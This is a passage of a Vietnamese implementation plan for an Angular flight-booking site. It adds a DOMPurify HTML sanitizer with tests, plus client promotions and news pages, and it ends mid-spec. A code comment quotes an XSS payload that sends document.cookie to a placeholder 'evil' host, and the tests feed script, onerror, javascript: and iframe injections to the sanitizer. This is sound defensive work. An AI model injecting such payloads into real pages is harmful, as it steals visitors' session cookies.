**Vì sao DOMPurify thay vì `DomSanitizer` của Angular:** `DomSanitizer.sanitize(SecurityContext.HTML, ...)` chỉ dùng được trong template với `[innerHTML]`, và nó **chặn cả những thứ hợp lệ** như thẻ `<table>`, đồng thời không cho kiểm soát allowlist. DOMPurify là thư viện chuẩn công nghiệp cho việc này, allowlist mặc định đã tính tới hơn 200 vector XSS đã biết, và chạy được cả trong unit test (không cần DOM thật của Angular).

- [ ] **Step 2: Viết service**

Tạo `src/app/core/services/sanitize.service.ts`:

```ts
import { Injectable } from '@angular/core';
import DOMPurify from 'dompurify';

/**
 * Làm sạch HTML trước khi render — chống XSS.
 *
 * Vì sao cần: `news_items.content` là HTML do ADMIN nhập (đã chốt ở API v0.2 mục
 * 2.9). Render thẳng bằng `[innerHTML]` thì một bài viết chứa
 * `<img src=x onerror="fetch('//evil/'+document.cookie)">` sẽ chạy script trong
 * trình duyệt của MỌI khách đọc bài đó.
 *
 * Vì sao allowlist hẹp hơn mặc định của DOMPurify: bài viết chỉ cần định dạng
 * văn bản và ảnh. Chặn luôn `iframe`, `form`, `input` — chúng không có chỗ trong
 * một bài tin và là vector chèn nội dung ngoài.
 */
@Injectable({ providedIn: 'root' })
export class SanitizeService {
  private static readonly ALLOWED_TAGS = [
    'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's',
    'h1', 'h2', 'h3', 'h4',
    'ul', 'ol', 'li',
    'blockquote',
    'a', 'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'figure', 'figcaption', 'hr', 'span', 'div',
  ];

  private static readonly ALLOWED_ATTR = ['href', 'title', 'target', 'rel', 'src', 'alt', 'width', 'height'];

  sanitizeHtml(html: string): string {
    if (!html) {
      return '';
    }
    return DOMPurify.sanitize(html, {
      ALLOWED_TAGS: SanitizeService.ALLOWED_TAGS,
      ALLOWED_ATTR: SanitizeService.ALLOWED_ATTR,
      // Chặn hẳn giao thức nguy hiểm, kể cả khi lọt qua allowlist thẻ.
      ALLOWED_URI_REGEXP: /^(?:https?|mailto|tel):/i,
      // Link ngoài mở tab mới phải kèm rel để không bị lộ referrer và không cho
      // trang đích điều khiển tab cũ (reverse tabnabbing).
      ADD_ATTR: ['target'],
      FORBID_TAGS: ['style', 'script', 'iframe', 'form', 'input', 'object', 'embed'],
      FORBID_ATTR: ['onerror', 'onload', 'onclick', 'style'],
    });
  }
}
```

- [ ] **Step 3: Viết test**

Tạo `src/app/core/services/sanitize.service.spec.ts`:

```ts
import { TestBed } from '@angular/core/testing';
import { SanitizeService } from '@core/services/sanitize.service';

describe('SanitizeService', () => {
  let service: SanitizeService;

  beforeEach(() => {
    TestBed.configureTestingModule({});
    service = TestBed.inject(SanitizeService);
  });

  it('loại bỏ thẻ script', () => {
    const out = service.sanitizeHtml('<p>An toàn</p><script>alert(1)</script>');
    expect(out).not.toContain('<script');
    expect(out).toContain('An toàn');
  });

  it('loại bỏ thuộc tính onerror trên ảnh', () => {
    const out = service.sanitizeHtml('<img src=x onerror="alert(1)">');
    expect(out).not.toContain('onerror');
  });

  it('loại bỏ href dùng javascript:', () => {
    const out = service.sanitizeHtml('<a href="javascript:alert(1)">bấm</a>');
    expect(out).not.toContain('javascript:');
  });

  it('loại bỏ iframe và form', () => {
    const out = service.sanitizeHtml('<iframe src="//evil"></iframe><form><input></form>');
    expect(out).not.toContain('<iframe');
    expect(out).not.toContain('<form');
  });

  it('GIỮ định dạng hợp lệ', () => {
    const out = service.sanitizeHtml('<p>Đoạn <strong>đậm</strong> và <em>nghiêng</em></p><ul><li>mục</li></ul>');
    expect(out).toContain('<strong>đậm</strong>');
    expect(out).toContain('<em>nghiêng</em>');
    expect(out).toContain('<li>mục</li>');
  });

  it('GIỮ link http bình thường', () => {
    const out = service.sanitizeHtml('<a href="https://example.com">xem</a>');
    expect(out).toContain('href="https://example.com"');
  });

  it('chuỗi rỗng trả chuỗi rỗng, không ném lỗi', () => {
    expect(service.sanitizeHtml('')).toBe('');
  });
});
```

- [ ] **Step 4: Chạy test — PASS**

Run: `npx ng test --watch=false`
Expected: PASS, gồm 7 test mới.

- [ ] **Step 5: Commit**

```bash
git add package.json package-lock.json src/app/core/services/sanitize.service.ts \
  src/app/core/services/sanitize.service.spec.ts
git commit -m "feat(security): thêm DOMPurify và service làm sạch HTML chống XSS"
```

### Task 4.2: Trang Khuyến mãi cho khách

**Files:**
- Create: `src/app/features/client/pages/promotions/promotion-list.ts`
- Create: `src/app/features/client/pages/promotions/promotion-list.html`
- Create: `src/app/features/client/pages/promotions/promotion-list.css`
- Create: `src/app/features/client/pages/promotions/promotion-detail.ts`
- Create: `src/app/features/client/pages/promotions/promotion-detail.html`
- Create: `src/app/features/client/pages/promotions/promotion-detail.css`
- Modify: `src/app/app.routes.ts`

**Interfaces:**
- Consumes: `PromotionService`, `Promotion`; `SanitizeService` (không dùng ở đây, chỉ ở Tin tức).
- Produces: `ClientPromotionList`, `ClientPromotionDetail`; route `/promotions`, `/promotions/:id`.

- [ ] **Step 1: Viết trang danh sách — TS**

Tạo `promotion-list.ts`:

```ts
import { ChangeDetectionStrategy, Component, computed, inject, signal } from '@angular/core';
import { RouterLink } from '@angular/router';
import { MatIconModule } from '@angular/material/icon';
import { Promotion } from '@core/models/promotion.model';
import { PromotionService } from '@core/services/catalog.service';
import { AppCard } from '@shared/ui/app-card/app-card';
import { EmptyState } from '@shared/components/empty-state/empty-state';
import { SkeletonBlock } from '@shared/ui/skeleton-block/skeleton-block';

/** Một thẻ khuyến mãi — dữ liệu đã kèm nhãn và màu để template không phải tính. */
interface PromoCard {
  promo: Promotion;
  badge: string;
  tone: 'danger' | 'primary' | 'accent';
  /** Mô tả ngắn để hiện trên thẻ; cắt từ `description` nếu quá dài. */
  summary: string;
}

/**
 * Khuyến mãi cho khách — PROMO-01 (API v0.2 mục 2.7).
 *
 * Chỉ hiện chương trình ĐANG HIỆU LỰC: `is_active` và hôm nay nằm trong khoảng
 * `start_date`–`end_date`. Backend đã lọc cho GUEST nhưng mock trả về tất cả,
 * nên lọc ở đây để hai chế độ hành xử giống nhau.
 */
@Component({
  selector: 'app-promotion-list',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [RouterLink, MatIconModule, AppCard, EmptyState, SkeletonBlock],
  templateUrl: './promotion-list.html',
  styleUrl: './promotion-list.css',
})
export class ClientPromotionList {
  private readonly promotionService = inject(PromotionService);

  protected readonly loading = signal(true);
  protected readonly promos = signal<PromoCard[]>([]);

  private static readonly money = new Intl.NumberFormat('vi-VN');

  constructor() {
    this.promotionService.list({ page: 1, size: 50, sort: 'start_date,desc' }).subscribe({
      next: (res) => {
        const today = ClientPromotionList.todayIso();
        const active = res.data.items.filter(
          (p) => p.is_active && !p.is_deleted && p.start_date <= today && p.end_date >= today,
        );
        this.promos.set(active.map((p, i) => this.toCard(p, i)));
        this.loading.set(false);
      },
      error: () => this.loading.set(false),
    });
  }

  /**
   * Ngày hôm nay theo GIỜ MÁY — không dùng `toISOString()` vì nó trả ngày UTC,
   * lệch một ngày so với giờ Việt Nam trong 7 giờ đầu ngày.
   */
  private static todayIso(): string {
    const d = new Date();
    return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
  }

  private toCard(p: Promotion, index: number): PromoCard {
    const tones: PromoCard['tone'][] = ['danger', 'primary', 'accent'];
    const fallback =
      p.discount_type === 'PERCENT'
        ? `Giảm ${p.discount_value}%`
        : `Giảm ${ClientPromotionList.money.format(p.discount_value)}₫`;

    return {
      promo: p,
      badge: p.badge_label?.trim() || fallback,
      tone: tones[index % 3],
      summary: p.description?.trim() || 'Xem chi tiết chương trình để biết điều kiện áp dụng.',
    };
  }

  protected formatDate(iso: string): string {
    return new Date(iso).toLocaleDateString('vi-VN', { day: '2-digit', month: '2-digit', year: 'numeric' });
  }

  /** Số ngày còn lại — nhắc khách sắp hết hạn. */
  protected daysLeft(endDate: string): number {
    const end = new Date(`${endDate}T23:59:59`);
    return Math.max(0, Math.ceil((end.getTime() - Date.now()) / 86_400_000));
  }
}
```

- [ ] **Step 2: Viết trang danh sách — HTML**

Tạo `promotion-list.html`:

```html
<div class="wrap">
  <header class="page-h">
    <div>
      <h1>Khuyến mãi</h1>
      <p>Các chương trình ưu đãi đang áp dụng cho chuyến bay nội địa</p>
    </div>
  </header>

  @if (loading()) {
    <div class="promo-grid">
      @for (i of [1, 2, 3, 4]; track i) {
        <div class="promo promo--skeleton">
          <app-skeleton-block height="150px" />
          <div class="promo__bd">
            <app-skeleton-block width="70%" height="16px" />
            <div style="height: 9px"></div>
            <app-skeleton-block width="90%" height="12px" />
          </div>
        </div>
      }
    </div>
  } @else if (promos().length === 0) {
    <app-app-card>
      <app-empty-state
        icon="local_offer"
        message="Hiện chưa có chương trình khuyến mãi"
        hint="Ưu đãi mới sẽ xuất hiện ở đây"
      />
    </app-app-card>
  } @else {
    <div class="promo-grid">
      @for (item of promos(); track item.promo.id) {
        <article class="promo">
          <a class="promo__link" [routerLink]="['/promotions', item.promo.id]">
            @if (item.promo.image_url) {
              <div class="promo__img">
                <img class="promo__pic" [src]="item.promo.image_url" [alt]="item.promo.promotion_name" loading="lazy" />
                <span class="promo__tag" [class]="'promo__tag--' + item.tone">{{ item.badge }}</span>
              </div>
            } @else {
              <div class="promo__img promo__img--ph">
                <mat-icon>local_offer</mat-icon>
                <span class="promo__tag" [class]="'promo__tag--' + item.tone">{{ item.badge }}</span>
              </div>
            }

            <div class="promo__bd">
              <div class="promo__nm">{{ item.promo.promotion_name }}</div>
              <p class="promo__ds">{{ item.summary }}</p>
              <div class="promo__meta">
                <span><mat-icon>event</mat-icon> Đến {{ formatDate(item.promo.end_date) }}</span>
                @if (daysLeft(item.promo.end_date) <= 7) {
                  <span class="promo__soon">Còn {{ daysLeft(item.promo.end_date) }} ngày</span>
                }
              </div>
              <div class="promo__lk">Xem chi tiết <mat-icon>arrow_forward</mat-icon></div>
            </div>
          </a>
        </article>
      }
    </div>
  }
</div>
```

- [ ] **Step 3: Viết trang danh sách — CSS**

Tạo `promotion-list.css`. Sao chép phần `.wrap`, `.page-h`, `.promo-grid`, `.promo`, `.promo__*` từ `home.css` (giữ nguyên giá trị), rồi thêm:

```css
/* Hàng meta: hạn dùng + cảnh báo sắp hết. */
.promo__meta {
  display: flex;
  align-items: center;
  gap: 10px;
  flex-wrap: wrap;
  font-size: 11.5px;
  color: var(--color-ink-muted);
  margin-bottom: 9px;
}

.promo__meta span {
  display: inline-flex;
  align-items: center;
  gap: 4px;
}

.promo__meta mat-icon {
  font-size: 14px;
  width: 14px;
  height: 14px;
}

.promo__soon {
  font-weight: 700;
  color: var(--color-danger);
}

.promo--skeleton {
  pointer-events: none;
}
```

- [ ] **Step 4: Viết trang chi tiết — TS**

Tạo `promotion-detail.ts`:

```ts
import { ChangeDetectionStrategy, Component, computed, inject, signal } from '@angular/core';
import { ActivatedRoute, Router, RouterLink } from '@angular/router';
import { MatIconModule } from '@angular/material/icon';
import { Promotion } from '@core/models/promotion.model';
import { PromotionService } from '@core/services/catalog.service';
import { AppCard } from '@shared/ui/app-card/app-card';
import { AppButton } from '@shared/ui/app-button/app-button';
import { LoadingState } from '@shared/ui/loading-state/loading-state';

/**
 * Chi tiết khuyến mãi — PROMO-02 (API v0.2 mục 2.7).
 *
 * Vì sao hiện cả điều kiện kỹ thuật (trần giảm, giá tối thiểu, loại hành trình,
 * phạm vi): khách cần biết vì sao vé của mình KHÔNG được giảm. Giấu đi thì họ
 * chỉ thấy "khuyến mãi không hoạt động" mà không hiểu lý do.
 */
@Component({
  selector: 'app-promotion-detail',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [RouterLink, MatIconModule, AppCard, AppButton, LoadingState],
  templateUrl: './promotion-detail.html',
  styleUrl: './promotion-detail.css',
})
export class ClientPromotionDetail {
  private readonly service = inject(PromotionService);
  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);

  protected readonly loading = signal(true);
  protected readonly promo = signal<Promotion | null>(null);

  private static readonly money = new Intl.NumberFormat('vi-VN');

  /** Câu mô tả mức giảm bằng lời, ví dụ "Giảm 15%, tối đa 150.000₫ mỗi vé". */
  protected readonly discountText = computed(() => {
    const p = this.promo();
    if (!p) return '';

    const value =
      p.discount_type === 'PERCENT'
        ? `Giảm ${p.discount_value}%`
        : `Giảm ${ClientPromotionDetail.money.format(p.discount_value)}₫`;

    if (p.discount_type === 'PERCENT' && p.max_discount_amount) {
      return `${value}, tối đa ${ClientPromotionDetail.money.format(p.max_discount_amount)}₫ mỗi vé`;
    }
    return value;
  });

  protected readonly tripTypeText = computed(() => {
    switch (this.promo()?.applicable_trip_type) {
      case 'ONE_WAY':
        return 'Chỉ áp dụng vé một chiều';
      case 'ROUND_TRIP':
        return 'Chỉ áp dụng vé khứ hồi';
      default:
        return 'Áp dụng cho mọi hành trình';
    }
  });

  constructor() {
    const id = this.route.snapshot.paramMap.get('id');
    if (!id) {
      this.router.navigate(['/promotions']);
      return;
    }
    this.service.getById(Number(id)).subscribe({
      next: (res) => {
        this.promo.set(res.data);
        this.loading.set(false);
      },
      error: () => {
        this.loading.set(false);
        this.router.navigate(['/promotions']);
      },
    });
  }

  protected formatMoney(v: number): string {
    return ClientPromotionDetail.money.format(v);
  }

  protected formatDate(iso: string): string {
    return new Date(iso).toLocaleDateString('vi-VN', { day: '2-digit', month: '2-digit', year: 'numeric' });
  }

  protected back(): void {
    this.router.navigate(['/promotions']);
  }
}
```

- [ ] **Step 5: Viết trang chi tiết — HTML**

Tạo `promotion-detail.html`:

```html
<div class="wrap wrap--narrow">
  <nav class="crumbs" aria-label="Đường dẫn">
    <a routerLink="/promotions">Khuyến mãi</a>
    <mat-icon>chevron_right</mat-icon>
    <span>Chi tiết</span>
  </nav>

  @if (loading()) {
    <app-app-card><app-loading-state /></app-app-card>
  } @else if (promo(); as p) {
    <app-app-card>
      @if (p.image_url) {
        <img class="hero-img" [src]="p.image_url" [alt]="p.promotion_name" />
      }

      <h1 class="title">{{ p.promotion_name }}</h1>

      @if (p.badge_label) {
        <span class="badge">{{ p.badge_label }}</span>
      }

      @if (p.description) {
        <p class="desc">{{ p.description }}</p>
      }

      <dl class="facts">
        <div class="fact">
          <dt>Mức giảm</dt>
          <dd>{{ discountText() }}</dd>
        </div>
        <div class="fact">
          <dt>Điều kiện giá vé</dt>
          <dd>
            @if (p.min_fare_amount) {
              Vé từ {{ formatMoney(p.min_fare_amount) }}₫ trở lên
            } @else {
              Không yêu cầu giá vé tối thiểu
            }
          </dd>
        </div>
        <div class="fact">
          <dt>Hành trình</dt>
          <dd>{{ tripTypeText() }}</dd>
        </div>
        <div class="fact">
          <dt>Thời gian áp dụng</dt>
          <dd>{{ formatDate(p.start_date) }} – {{ formatDate(p.end_date) }}</dd>
        </div>
        <div class="fact">
          <dt>Mã chương trình</dt>
          <dd class="code">{{ p.promotion_code }}</dd>
        </div>
      </dl>

      <p class="note">
        Mức giảm được áp tự động khi bạn tìm chuyến bay phù hợp — không cần nhập mã.
      </p>

      <div class="actions">
        <app-app-button variant="ghost" (clicked)="back()">Quay lại</app-app-button>
        <a class="cta" routerLink="/flights">Tìm chuyến bay <mat-icon>arrow_forward</mat-icon></a>
      </div>
    </app-app-card>
  }
</div>
```

- [ ] **Step 6: Viết trang chi tiết — CSS**

Tạo `promotion-detail.css`:

```css
.wrap--narrow {
  max-width: 780px;
}

.crumbs {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 13px;
  color: var(--color-ink-muted);
  margin-bottom: 12px;
}

.crumbs a {
  color: var(--color-ink-muted);
  text-decoration: none;
}

.crumbs a:hover {
  color: var(--color-primary);
}

.crumbs mat-icon {
  font-size: 17px;
  width: 17px;
  height: 17px;
  color: var(--color-ink-subtle);
}

.hero-img {
  width: 100%;
  height: 240px;
  object-fit: cover;
  border-radius: var(--radius);
  margin-bottom: 16px;
}

.title {
  font-family: var(--font-heading);
  font-size: 25px;
  font-weight: 700;
  margin: 0 0 9px;
}

.badge {
  display: inline-block;
  font-size: 12px;
  font-weight: 800;
  padding: 4px 12px;
  border-radius: var(--radius-sm);
  background: var(--color-danger);
  color: #fff;
  margin-bottom: 14px;
}

.desc {
  font-size: 14.5px;
  line-height: 1.65;
  color: var(--color-ink-muted);
  margin: 0 0 18px;
}

.facts {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
  gap: 14px;
  margin: 0 0 18px;
  padding: 16px;
  background: var(--color-surface-alt);
  border-radius: var(--radius);
}

.fact dt {
  font-size: 11.5px;
  font-weight: 600;
  color: var(--color-ink-subtle);
  margin-bottom: 3px;
}

.fact dd {
  margin: 0;
  font-size: 14px;
  font-weight: 600;
}

.fact .code {
  font-family: var(--font-mono, monospace);
  letter-spacing: 0.5px;
}

.note {
  margin: 0 0 18px;
  padding: 11px 13px;
  background: var(--color-info-soft);
  color: var(--color-on-info-soft);
  border-left: 3px solid var(--color-primary-bright);
  border-radius: var(--radius);
  font-size: 12.5px;
  line-height: 1.55;
}

.actions {
  display: flex;
  justify-content: flex-end;
  align-items: center;
  gap: 10px;
  flex-wrap: wrap;
}

.cta {
  display: inline-flex;
  align-items: center;
  gap: 5px;
  padding: 11px 18px;
  border-radius: var(--radius);
  background: var(--color-primary-bright);
  color: #fff;
  font-size: 14px;
  font-weight: 600;
  text-decoration: none;
}

.cta:hover {
  background: var(--color-primary);
}

.cta mat-icon {
  font-size: 17px;
  width: 17px;
  height: 17px;
}
```

- [ ] **Step 7: Thêm route**

Trong `src/app/app.routes.ts`, **thay** khối `promotions` (đang trỏ `coming-soon`) bằng:

```ts
      {
        path: 'promotions',
        loadComponent: () =>
          import('@features/client/pages/promotions/promotion-list').then(
            (m) => m.ClientPromotionList,
          ),
        data: { title: 'Khuyến mãi' },
      },
      {
        path: 'promotions/:id',
        loadComponent: () =>
          import('@features/client/pages/promotions/promotion-detail').then(
            (m) => m.ClientPromotionDetail,
          ),
        data: { title: 'Chi tiết khuyến mãi' },
      },
```

**Lưu ý thứ tự:** `promotions` phải đứng TRƯỚC `promotions/:id` — nếu không Angular khớp chuỗi rỗng vào `:id`.

- [ ] **Step 8: Build + kiểm chứng trên trình duyệt**

Run: `npx ng build`
Expected: build xanh.

Trên trình duyệt (khách, không cần đăng nhập):
- `/promotions`: chỉ hiện chương trình đang hiệu lực (mock có `TET2027` tạm dừng và `SUMMER99` chưa tới ngày → không được hiện), mỗi thẻ có nhãn và hạn dùng.
- Bấm một thẻ → `/promotions/2` hiện ảnh, mức giảm dạng câu, điều kiện giá vé, hành trình, khoảng thời gian.
- 375px: một cột, không tràn ngang.

- [ ] **Step 9: Commit**

```bash
git add src/app/features/client/pages/promotions/ src/app/app.routes.ts
git commit -m "feat(promotion): trang khuyến mãi và chi tiết cho khách"
```

### Task 4.3: Trang Tin tức cho khách (có sanitize)

**Files:**
- Create: `src/app/features/client/pages/news/news-list.ts`
- Create: `src/app/features/client/pages/news/news-list.html`
- Create: `src/app/features/client/pages/news/news-list.css`
- Create: `src/app/features/client/pages/news/news-detail.ts`
- Create: `src/app/features/client/pages/news/news-detail.html`
- Create: `src/app/features/client/pages/news/news-detail.css`
- Modify: `src/app/app.routes.ts`
- Test: `src/app/features/client/pages/news/news-detail.spec.ts`

**Interfaces:**
- Consumes: `NewsService`, `NewsItem`; `SanitizeService` từ Task 4.1.
- Produces: `ClientNewsList`, `ClientNewsDetail`; route `/news`, `/news/:id`.

- [ ] **Step 1: Viết trang danh sách — TS**

Tạo `news-list.ts`:

```ts
import { ChangeDetectionStrategy, Component, inject, signal } from '@angular/core';
import { RouterLink } from '@angular/router';
import { MatIconModule } from '@angular/material/icon';
import { NewsItem } from '@core/models/fleet-news.model';
import { NewsService } from '@core/services/catalog.service';
import { AppCard } from '@shared/ui/app-card/app-card';
import { EmptyState } from '@shared/components/empty-state/empty-state';
import { SkeletonBlock } from '@shared/ui/skeleton-block/skeleton-block';

/**
 * Tin tức cho khách — NEWS-01 (API v0.2 mục 2.9).
 *
 * Chỉ hiện bài ĐÃ ĐĂNG. Backend lọc `status = PUBLISHED` cho GUEST, nhưng mock
 * trả cả bản nháp nên phải tự lọc để hai chế độ hành xử như nhau.
 */
@Component({
  selector: 'app-news-list',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [RouterLink, MatIconModule, AppCard, EmptyState, SkeletonBlock],
  templateUrl: './news-list.html',
  styleUrl: './news-list.css',
})
export class ClientNewsList {
  private readonly newsService = inject(NewsService);

  protected readonly loading = signal(true);
  protected readonly news = signal<NewsItem[]>([]);
  protected readonly brokenThumbs = signal<Set<number>>(new Set());

  constructor() {
    this.newsService.list({ page: 1, size: 12, sort: 'published_at,desc' }).subscribe({
      next: (res) => {
        this.news.set(res.data.items.filter((n) => n.status === 'PUBLISHED'));
        this.loading.set(false);
      },
      error: () => this.loading.set(false),
    });
  }

  protected markBroken(id: number): void {
    const next = new Set(this.brokenThumbs());
    next.add(id);
    this.brokenThumbs.set(next);
  }

  protected formatDate(iso: string): string {
    return new Date(iso).toLocaleDateString('vi-VN', { day: '2-digit', month: '2-digit', year: 'numeric' });
  }

  /**
   * Mô tả ngắn cho thẻ tin — cắt từ `content`.
   *
   * LƯU Ý: chỉ dùng để hiện chữ, KHÔNG render HTML. Ở đây bỏ thẻ bằng regex là
   * đủ an toàn vì kết quả đi vào nội suy `{{ }}` (Angular tự escape). Việc render
   * HTML thật chỉ xảy ra ở trang chi tiết, và ở đó phải qua `SanitizeService`.
   */
  protected excerpt(html: string): string {
    const text = html.replace(/<[^>]*>/g, ' ').replace(/\s+/g, ' ').trim();
    return text.length > 130 ? `${text.slice(0, 130)}…` : text;
  }
}
```

- [ ] **Step 2: Viết trang danh sách — HTML**

Tạo `news-list.html`:

```html
<div class="wrap">
  <header class="page-h">
    <div>
      <h1>Tin tức &amp; cẩm nang</h1>
      <p>Thông tin mới nhất từ các hãng bay và kinh nghiệm bay nội địa</p>
    </div>
  </header>

  @if (loading()) {
    <div class="news-grid">
      @for (i of [1, 2, 3, 4, 5, 6]; track i) {
        <div class="news news--skeleton">
          <app-skeleton-block height="160px" />
          <div class="news__bd">
            <app-skeleton-block width="80%" height="16px" />
            <div style="height: 9px"></div>
            <app-skeleton-block width="55%" height="12px" />
          </div>
        </div>
      }
    </div>
  } @else if (news().length === 0) {
    <app-app-card>
      <app-empty-state icon="feed" message="Chưa có tin tức" hint="Bài viết mới sẽ xuất hiện ở đây" />
    </app-app-card>
  } @else {
    <div class="news-grid">
      @for (item of news(); track item.id) {
        <article class="news">
          <a class="news__link" [routerLink]="['/news', item.id]">
            @if (item.thumbnail_url && !brokenThumbs().has(item.id)) {
              <img
                class="news__img"
                [src]="item.thumbnail_url"
                [alt]="item.title"
                loading="lazy"
                (error)="markBroken(item.id)"
              />
            } @else {
              <span class="news__img news__img--ph" aria-hidden="true">
                <mat-icon>article</mat-icon>
              </span>
            }

            <div class="news__bd">
              @if (item.published_at) {
                <div class="news__date">{{ formatDate(item.published_at) }}</div>
              }
              <h3 class="news__title">{{ item.title }}</h3>
              <p class="news__excerpt">{{ excerpt(item.content) }}</p>
              <span class="news__lk">Đọc tiếp <mat-icon>arrow_forward</mat-icon></span>
            </div>
          </a>
        </article>
      }
    </div>
  }
</div>
```

- [ ] **Step 3: Viết trang danh sách — CSS**

Tạo `news-list.css`. Sao chép `.wrap`, `.page-h`, `.news-grid`, `.news`, `.news__*` từ `home.css`.

- [ ] **Step 4: Viết trang chi tiết — TS (có sanitize)**

Tạo `news-detail.ts`:

```ts
import { ChangeDetectionStrategy, Component, computed, inject, signal } from '@angular/core';
import { ActivatedRoute, Router, RouterLink } from '@angular/router';
import { MatIconModule } from '@angular/material/icon';
import { NewsItem } from '@core/models/fleet-news.model';
import { NewsService } from '@core/services/catalog.service';
import { SanitizeService } from '@core/services/sanitize.service';
import { AppCard } from '@shared/ui/app-card/app-card';
import { AppButton } from '@shared/ui/app-button/app-button';
import { LoadingState } from '@shared/ui/loading-state/loading-state';

/**
 * Chi tiết tin tức — NEWS-02 (API v0.2 mục 2.9).
 *
 * Vì sao `content` phải qua `SanitizeService` trước khi bind `[innerHTML]`:
 * nội dung là HTML do ADMIN nhập. Bind thẳng là mở đường cho XSS chạy trên máy
 * của mọi khách đọc bài — xem `sanitize.service.ts`.
 */
@Component({
  selector: 'app-news-detail',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [RouterLink, MatIconModule, AppCard, AppButton, LoadingState],
  templateUrl: './news-detail.html',
  styleUrl: './news-detail.css',
})
export class ClientNewsDetail {
  private readonly newsService = inject(NewsService);
  private readonly sanitizeService = inject(SanitizeService);
  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);

  protected readonly loading = signal(true);
  protected readonly article = signal<NewsItem | null>(null);

  /**
   * Nội dung ĐÃ làm sạch — đây là thứ duy nhất được bind vào `[innerHTML]`.
   * Không bind `article()!.content` ở bất kỳ đâu trong template.
   */
  protected readonly safeContent = computed(() => {
    const a = this.article();
    return a ? this.sanitizeService.sanitizeHtml(a.content) : '';
  });

  /** Tên danh mục để hiện nhãn — API trả kèm `categories` ở endpoint chi tiết. */
  protected readonly categoryNames = computed(
    () => this.article()?.categories?.map((c) => c.category_name) ?? [],
  );

  constructor() {
    const id = this.route.snapshot.paramMap.get('id');
    if (!id) {
      this.router.navigate(['/news']);
      return;
    }
    this.newsService.getById(Number(id)).subscribe({
      next: (res) => {
        this.article.set(res.data);
        this.loading.set(false);
      },
      error: () => {
        this.loading.set(false);
        this.router.navigate(['/news']);
      },
    });
  }

  protected formatDate(iso: string): string {
    return new Date(iso).toLocaleDateString('vi-VN', {
      weekday: 'long',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
    });
  }

  protected back(): void {
    this.router.navigate(['/news']);
  }
}
```

- [ ] **Step 5: Viết trang chi tiết — HTML**

Tạo `news-detail.html`:

```html
<div class="wrap wrap--narrow">
  <nav class="crumbs" aria-label="Đường dẫn">
    <a routerLink="/news">Tin tức</a>
    <mat-icon>chevron_right</mat-icon>
    <span>Bài viết</span>
  </nav>

  @if (loading()) {
    <app-app-card><app-loading-state /></app-app-card>
  } @else if (article(); as a) {
    <app-app-card>
      <article class="article">
        @if (a.thumbnail_url) {
          <img class="hero-img" [src]="a.thumbnail_url" [alt]="a.title" />
        }

        <header class="head">
          @if (a.published_at) {
            <time class="date">{{ formatDate(a.published_at) }}</time>
          }
          <h1 class="title">{{ a.title }}</h1>

          @if (categoryNames().length > 0) {
            <div class="cats">
              @for (c of categoryNames(); track c) {
                <span class="cat">{{ c }}</span>
              }
            </div>
          }
        </header>

        <!-- `safeContent()` đã qua DOMPurify. TUYỆT ĐỐI không bind `a.content`
             trực tiếp ở đây — xem sanitize.service.ts. -->
        <div class="body" [innerHTML]="safeContent()"></div>
      </article>

      <div class="actions">
        <app-app-button variant="ghost" (clicked)="back()">Quay lại danh sách</app-app-button>
      </div>
    </app-app-card>
  }
</div>
```

- [ ] **Step 6: Viết trang chi tiết — CSS**

Tạo `news-detail.css`:

```css
.wrap--narrow {
  max-width: 780px;
}

.crumbs {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 13px;
  color: var(--color-ink-muted);
  margin-bottom: 12px;
}

.crumbs a {
  color: var(--color-ink-muted);
  text-decoration: none;
}

.crumbs a:hover {
  color: var(--color-primary);
}

.crumbs mat-icon {
  font-size: 17px;
  width: 17px;
  height: 17px;
  color: var(--color-ink-subtle);
}

.hero-img {
  width: 100%;
  height: 260px;
  object-fit: cover;
  border-radius: var(--radius);
  margin-bottom: 18px;
}

.date {
  display: block;
  font-size: 12.5px;
  color: var(--color-ink-subtle);
  margin-bottom: 6px;
  text-transform: capitalize;
}

.title {
  font-family: var(--font-heading);
  font-size: 27px;
  font-weight: 700;
  line-height: 1.3;
  margin: 0 0 12px;
}

.cats {
  display: flex;
  gap: 7px;
  flex-wrap: wrap;
  margin-bottom: 20px;
}

.cat {
  font-size: 11.5px;
  font-weight: 600;
  padding: 3px 10px;
  border-radius: 999px;
  background: var(--color-primary-soft);
  color: var(--color-primary);
}

/* Nội dung bài viết — định dạng cho HTML đã làm sạch. */
.body {
  font-size: 15px;
  line-height: 1.75;
  color: var(--color-ink);
}

.body :first-child {
  margin-top: 0;
}

.body p {
  margin: 0 0 15px;
}

.body h2,
.body h3,
.body h4 {
  font-family: var(--font-heading);
  margin: 24px 0 10px;
  line-height: 1.35;
}

.body ul,
.body ol {
  margin: 0 0 15px;
  padding-left: 22px;
}

.body li {
  margin-bottom: 6px;
}

.body img {
  max-width: 100%;
  height: auto;
  border-radius: var(--radius);
  margin: 8px 0;
}

.body a {
  color: var(--color-primary-bright);
}

.body blockquote {
  margin: 0 0 15px;
  padding: 10px 16px;
  border-left: 3px solid var(--color-primary-bright);
  background: var(--color-surface-alt);
  color: var(--color-ink-muted);
}

.body table {
  width: 100%;
  border-collapse: collapse;
  margin: 0 0 15px;
  font-size: 13.5px;
}

.body th,
.body td {
  border: 1px solid var(--color-border);
  padding: 8px 10px;
  text-align: left;
}

.actions {
  display: flex;
  justify-content: flex-end;
  margin-top: 20px;
}
```

- [ ] **Step 7: Viết test XSS**

Tạo `news-detail.spec.ts`:

```ts
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { TestBed } from '@angular/core/testing';
import { ActivatedRoute, convertToParamMap, provideRouter } from '@angular/router';
import { MockRegistry } from '@core/mock/mock-registry';
import { mockInterceptor } from '@core/mock/mock.interceptor';
import { ClientNewsDetail } from '@features/client/pages/news/news-detail';

function setup(id: string) {
  return TestBed.configureTestingModule({
    imports: [ClientNewsDetail],
    providers: [
      provideRouter([]),
